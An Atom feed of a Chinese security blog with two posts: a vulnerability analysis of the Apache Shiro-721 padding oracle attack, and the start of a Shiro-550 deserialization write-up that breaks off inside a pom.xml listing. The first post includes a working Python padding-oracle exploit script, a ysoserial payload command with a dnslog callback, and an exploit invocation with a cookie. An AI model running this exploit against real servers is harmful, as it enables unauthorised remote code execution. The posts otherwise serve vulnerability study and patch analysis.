<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2020-10-25T07:40:49.744Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅析Shiro Padding Oracle Attack（Shiro721）</title>
    <link href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/</id>
    <published>2020-10-14T12:27:34.000Z</published>
    <updated>2020-10-25T07:40:49.744Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>由于Apache Shiro 1.4.1及其之前版本的Cookie中的rememberMe字段是使用AES-128-CBC模式来加密生成的，因此攻击者可以在已有的正常登陆的Cookie rememberMe值的基础上根据Padding Oracle Attack的原理来暴破构造出恶意的rememberMe字段，重新发送暴破出来的恶意rememberMe值到服务端进而触发反序列化漏洞达到RCE。</p><p>关键步骤如图：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/10.png" alt=""></p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>Apache Shiro &lt;= 1.4.1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>远程环境搭建可参考：<a href="https://github.com/3ndz/Shiro-721" target="_blank" rel="noopener">https://github.com/3ndz/Shiro-721</a></p><p>或者，本地搭建：下载<a href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war" target="_blank" rel="noopener">samples-web-1.4.1.war</a>，放置到本地Tomcat的webapp目录中即可。</p><p>注意，samples-web-1.4.1\WEB-INF\lib中的CommonsCollections包版本为3.2.2，并非漏洞版本，需要自行更换为3.2.1漏洞版本，否则后面的漏洞复现会失败。</p><h2 id="0x04-前提条件"><a href="#0x04-前提条件" class="headerlink" title="0x04 前提条件"></a>0x04 前提条件</h2><p> Apache Shiro Padding Oracle Attack的漏洞利用必须满足如下前提条件：</p><ul><li>开启rememberMe功能；</li><li>rememberMe值使用AES-CBC模式解密；</li><li>能获取到正常Cookie，即用户正常登录的Cookie值；</li><li>密文可控；</li></ul><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>首先正常登录进去，勾选上rememberMe选项：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/4.png" alt=""></p><p>刷新当前页面或访问/account页面，获取此时登录成功的rememberMe值：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/5.png" alt=""></p><p>使用ysoserial工具生成URLDNS验证payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-6eca5bc740-1.jar URLDNS &quot;http://5zfnof.dnslog.cn&quot; &gt; payload.class</span><br></pre></td></tr></table></figure><p>利用<a href="https://github.com/3ndz/Shiro-721" target="_blank" rel="noopener">GitHub的exp</a>来进行Padding Oracle Attack：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/3ndz/Shiro-721</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> paddingoracle <span class="keyword">import</span> BadPaddingException, PaddingOracle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote, unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PadBuster</span><span class="params">(PaddingOracle)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">        super(PadBuster, self).__init__(**kwargs)</span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.wait = kwargs.get(<span class="string">'wait'</span>, <span class="number">2.0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(self, data, **kwargs)</span>:</span></span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[<span class="number">2</span>])) + data)</span><br><span class="line">        self.session.cookies[<span class="string">'rememberMe'</span>] = somecookie</span><br><span class="line">        <span class="keyword">if</span> self.session.cookies.get(<span class="string">'JSESSIONID'</span>):</span><br><span class="line">            <span class="keyword">del</span> self.session.cookies[<span class="string">'JSESSIONID'</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = self.session.get(sys.argv[<span class="number">1</span>],</span><br><span class="line">                        stream=<span class="keyword">False</span>, timeout=<span class="number">5</span>, verify=<span class="keyword">False</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (socket.error, requests.exceptions.RequestException):</span><br><span class="line">                logging.exception(<span class="string">'Retrying request in %.2f seconds...'</span>,</span><br><span class="line">                                  self.wait)</span><br><span class="line">                time.sleep(self.wait)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        self.history.append(response)</span><br><span class="line">        <span class="keyword">if</span> response.headers.get(<span class="string">'Set-Cookie'</span>) <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> <span class="string">'deleteMe'</span> <span class="keyword">not</span> <span class="keyword">in</span> response.headers.get(<span class="string">'Set-Cookie'</span>):</span><br><span class="line">            logging.debug(<span class="string">'No padding exception raised on %r'</span>, somecookie)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">raise</span> BadPaddingException</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> logging</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">3</span>:]:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;'</span> % (sys.argv[<span class="number">0</span>], )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)</span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    padbuster = PadBuster()</span><br><span class="line">    payload = open(sys.argv[<span class="number">3</span>], <span class="string">'rb'</span>).read()</span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">'rememberMe cookies:'</span>)</span><br><span class="line">    print(b64encode(enc))</span><br></pre></td></tr></table></figure><p>注意：需要安装paddingoracle库，其只能运行于Python2环境中。</p><p>运行该exp脚本进行暴破：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro-721_exp.py http://mi1k7ea.com/account/ 79i2DTxHODbt9xx9dXAwBVBFFzH+QxJ1elF+Y+8apWqUAvvc0HtEZYC9kcwXCPbcIZA/tUvLhzoSny6fEOSZIDtgTsvuCIWTz6zxSv3IEYg7AHHYVj1vvGQeDHuxXtclr9ipKCPWrXLaaMMObzGPrPbLWKvi5owo0YEklVL9EoStdZkslMcJo2y6hNYHro3SwtjhTh1vdhdH0hi2RGR70O+F5lKLnsOa9wvwfpz41kbzCCQyR82g16LhXRQgh4RUkHNmBynElujM/Gu8X7xpqlrhxXDr5MayBzFXTMMGOcjOm/bowf0BPn644tSLxR/7pSDxS+fTiTb5/odhk+QJpd1ayo5f9lKhcoJBiqRgO/nyPT8h/FoU/SDCiZL9oFTkvS2ZzzK69fqquLooB+5045x6kciBj2mgMYHlsapWzqlKW/Z1sXACZTtN5k8mDFVYH8iyQzO3YRBvUcXgD+0oLIizfmAq3lC5K8cNRvmH4q6QjQk48YK5psg6tK5V5R3y payload.class</span><br></pre></td></tr></table></figure><p>得到暴破后的rememberMe值：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/6.png" alt=""></p><p>替换请求Cookie中的rememberMe值重放：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/7.png" alt=""></p><p>成功打到DNSLOG：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/8.png" alt=""></p><h2 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h2><h3 id="Padding-Oracle-Attack构造加密数据"><a href="#Padding-Oracle-Attack构造加密数据" class="headerlink" title="Padding Oracle Attack构造加密数据"></a>Padding Oracle Attack构造加密数据</h3><p>之前写的Padding Oracle Attack文章以及网上讲的文章大多数都是讲的如何使用Padding Oracle Attack来获取明文。但是这种场景在Apache Shiro Padding Oracle Attack这个漏洞场景中就不适用了，这也是当初暴出这个漏洞的时候我一时间搞不清楚原理的地方。</p><p>从漏洞复现我们知道，我们是需要通过Padding Oracle Attack加密Cookie中的数据而并非解密数据。其实，<strong>Padding Oracle Attack的另一种利用方式就是构造加密数据</strong>。</p><p>具体原理可参考p0师傅的文章，讲解得十分详细！：<a href="https://p0sec.net/index.php/archives/126/" target="_blank" rel="noopener">Shiro Padding Oracle Attack 反序列化</a></p><p>这里简单说下Padding Oracle Attack加密数据整体过程：</p><ol><li>选择一个明文<code>P</code>，用来生成你想要的密文<code>C</code>；</li><li>使用适当的Padding将字符串填充为块大小的倍数，然后将其拆分为从1到N的块；</li><li>生成一个随机数据块（C[n]表示最后一个密文块）；</li><li>对于每一个明文块，从最后一块开始：<ol><li>创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块C[n+1]（如果是第一轮则是随机块）组合成的；</li><li>这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；</li><li>在计算完整个块之后，将它与明文块P[n]进行XOR一起创建C[n]；</li><li>对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；</li></ol></li></ol><p>简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值。</p><h3 id="一个Java反序列化Tips"><a href="#一个Java反序列化Tips" class="headerlink" title="一个Java反序列化Tips"></a>一个Java反序列化Tips</h3><p>Java原生反序列化是按照指定格式来读取序列化数据的，而ObjectOutputStream是一个对象操作流，其会按格式以队列方式读下去，也就是说在正常的序列化数据后面继续添加一些数据是不会影响反序列化操作的。</p><p>因此，我们可以在已有的Cookie rememberMe值后面加入一段数据，只要AES解密成功，就能进行反序列化操作，而这段数据是可以通过Padding Oracle Attack来构造Java原生反序列化漏洞利用Gadget的加密数据，从而就能触发Java原生反序列化漏洞了。</p><h3 id="Padding-Oracle的Bool判断依据"><a href="#Padding-Oracle的Bool判断依据" class="headerlink" title="Padding Oracle的Bool判断依据"></a>Padding Oracle的Bool判断依据</h3><p>要成功进行Padding Oracle Attack是需要服务端返回两个不同的响应特征来进行Bool判断的。</p><p>在Apache Shiro的场景中，这个服务端的两个不同的响应特征为：</p><ul><li>Padding Oracle错误时，服务端响应报文的Set-Cookie头字段返回<code>rememberMe=deleteMe</code>；</li><li>Padding Oracle正确时，服务端返回正常的响应报文内容；</li></ul><p>具体代码层面的原因在下面小节中会讲到。</p><h3 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p>在之前Shiro550的文章就对Shiro相关调用进行调试分析过了，这里就只对相关的代码进行解读分析。</p><p>直接看到org/apache/shiro/mgt/AbstractRememberMeManager类的getRememberedPrincipals()函数：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/11.png" alt=""></p><p>一样是调用convertBytesToPrincipals()函数，继续看往下的几层调用：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/12.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/13.png" alt=""></p><p>这里CipherService接口类decrypt()函数的实现类是org/apache/shiro/crypto/JcaCipherService类，decrypt()函数就是调用JcaCipherService类的decrypt()函数，我们逐步往下看几层函数调用：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/14.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/15.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/16.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/17.png" alt=""></p><p>从这条函数调用栈可以看出，如果Padding Oracle失败，就会抛出CryptoException的异常。</p><p>我们可以继续跟进doFinal()函数里面的调用栈进去看看是怎么判断Padding Oracle失败的。看到如下几个函数调用链：doFinal()函数-&gt;this.spi即AESCipher类中的engineDoFinal()函数-&gt;CipherCore类的doFinal()函数-&gt;CipherCore类的fillOutputBuffer()函数-&gt;CipherCore类的unpad()函数</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/23.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/24.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/25.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/26.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/27.png" alt=""></p><p>看到上述的unpad就是进行块padding的计算操作，如果返回值&lt;0则直接抛出BadPaddingException异常。而这里this.padding就是com\sun\crypto\provider\PKCS5Padding类，即1.4.1及以下版本Shiro使用AES-CBC的PKCS 5作为Padding规则。</p><p>看到PKCS5Padding类的unpad()函数，主要是根据PKCS 5规则来校验Padding是否正确，若不正确则返回-1。其中最关键的判断条件就是第三个if判断条件，其正是校验最后Padding的n位的值是否为0x0n：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/28.png" alt=""></p><p>而当PKCS5Padding类的unpad()函数返回-1时，就会返回到CipherCore类的unpad()函数中抛出BadPaddingException异常，而该异常会被捕获到并抛出CryptoException异常。</p><p>当抛出异常时，就会在函数调用栈前面的getRememberedPrincipals()函数中的try catch给捕获到，其中调用onRememberedPrincipalFailure()来处理抛出的异常信息：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/18.png" alt=""></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/19.png" alt=""></p><p>看到调用了forgetIdentity()函数，继续往下看到其实现类org/apache/shiro/web/mgt/CookieRememberMeManager：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/20.png" alt=""></p><p>这里removeFrom()函数的实现类是org/apache/shiro/web/servlet/SimpleCookie：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/21.png" alt=""></p><p>其中将DELETED_COOKIE_VALUE的值设置到响应报文的Set-Cookie头字段中的rememberMe中，而该值就是<code>deleteMe</code>：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/22.png" alt=""></p><p>至此，我们就知道了Padding Oracle失败后服务端会返回Set-Cookie头字段rememberMe值为<code>deleteMe</code>。</p><p>对于Padding Oracle正确的情况下，AES解密后的内容是要经过Java反序列化操作的，要想响应返回不同于Padding Oracle错误时的特征，就需要反序列化得到的是正常登录用户的Cookie rememberMe值，因此Padding Oracle Attack的前提是需要有正常登录用户的Cookie rememberMe值的（这块代码分析可参考<a href="https://xz.aliyun.com/t/7207#toc-3" target="_blank" rel="noopener">threedr3am师傅的文章</a>）。</p><p>最后，借用千里目安全实验室的一张图，展示了漏洞利用的主要过程：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/9.png" alt=""></p><h2 id="0x07-补丁分析"><a href="#0x07-补丁分析" class="headerlink" title="0x07 补丁分析"></a>0x07 补丁分析</h2><p>到Shiro 1.4.2版本后，将默认的AES-CBC模式改为了AES-GCM模式：</p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/1.png" alt=""></p><p>具体代码如下：<a href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e#diff-d61135f70077e55187e227aa61a3f72eef52568787ecbd59913e8a609b35019c" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e#diff-d61135f70077e55187e227aa61a3f72eef52568787ecbd59913e8a609b35019c</a></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/2.png" alt=""></p><h2 id="0x08-工具"><a href="#0x08-工具" class="headerlink" title="0x08 工具"></a>0x08 工具</h2><p>推荐ShiroExploit，暴破的过程一样的相当久：<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit</a></p><p><img src="/2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/3.png" alt=""></p><h2 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h2><p><a href="https://xz.aliyun.com/t/7207" target="_blank" rel="noopener">Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC</a></p><p><a href="https://p0sec.net/index.php/archives/126/" target="_blank" rel="noopener">Shiro Padding Oracle Attack 反序列化</a></p><p><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data" target="_blank" rel="noopener">Going the other way with padding oracles: Encrypting arbitrary data!</a></p><p><a href="https://mp.weixin.qq.com/s/j_gx9C_xL1LyrnuFFPFsfg" target="_blank" rel="noopener">Shiro组件漏洞与攻击链分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Shiro" scheme="https://www.mi1k7ea.com/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>浅析Shiro rememberMe反序列化漏洞（Shiro550）</title>
    <link href="https://www.mi1k7ea.com/2020/10/03/%E6%B5%85%E6%9E%90Shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro550%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/</id>
    <published>2020-10-03T07:51:06.000Z</published>
    <updated>2020-10-14T12:39:58.371Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API，您可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。</p><p>Apache Shiro基本功能点如下图所示：</p><p><img src="/2020/10/03/浅析Shiro-rememberMe反序列化漏洞（Shiro550）/1.png" alt=""></p><ul><li><strong>Authentication</strong>：身份认证 / 登录，验证用户是不是拥有相应的身份；</li><li><strong>Authorization</strong>：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；</li><li><strong>Session</strong> <strong>Management</strong>：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通 JavaSE 环境的，也可以是如 Web 环境的；</li><li><strong>Cryptography</strong>：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储；</li><li><strong>Web Support</strong>：Web 支持，可以非常容易的集成到 Web 环境；</li><li><strong>Caching</strong>：缓存，比如用户登录后，其用户信息、拥有的角色 / 权限不必每次去查，这样可以提高效率；</li><li><strong>Concurrency</strong>：shiro 支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去；</li><li><strong>Testing</strong>：提供测试支持；</li><li><strong>Run As</strong>：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问；</li><li><strong>Remember Me</strong>：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了；</li></ul><p>注意，本次的Shiro反序列化漏洞点就是出现在<strong>Remember Me</strong>这个功能模块上。</p><h2 id="0x02-Shiro-rememberMe反序列化漏洞（CVE-2016-4437）"><a href="#0x02-Shiro-rememberMe反序列化漏洞（CVE-2016-4437）" class="headerlink" title="0x02 Shiro rememberMe反序列化漏洞（CVE-2016-4437）"></a>0x02 Shiro rememberMe反序列化漏洞（CVE-2016-4437）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro &lt;= 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。</p><p>该漏洞的根源在于硬编码Key。</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>Apache Shiro &lt;= 1.2.4</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>直接参考Vulhub：<a href="https://vulhub.org/#/environments/shiro/CVE-2016-4437/" target="_blank" rel="noopener">https://vulhub.org/#/environments/shiro/CVE-2016-4437/</a></p><p>或者从GitHub下载漏洞版本的Shiro在本地搭建均可。</p><p>这里看下本地怎么搭建，这里使用Apache Shiro Quickstart示例页面作为本地靶机环境，先下载Shiro并切换到漏洞版本1.2.4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">git checkout shiro-root-1.2.4  #切换分支</span><br></pre></td></tr></table></figure><p>接着在IDEA中打开<code>shiro/samples/web</code>子目录为项目，修改pom.xml，注意最后要添加识别JSP标签的JSTL库和Standard库：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro.samples<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-samples<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../pom.xml<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>samples-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Apache Shiro :: Samples :: Web<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span 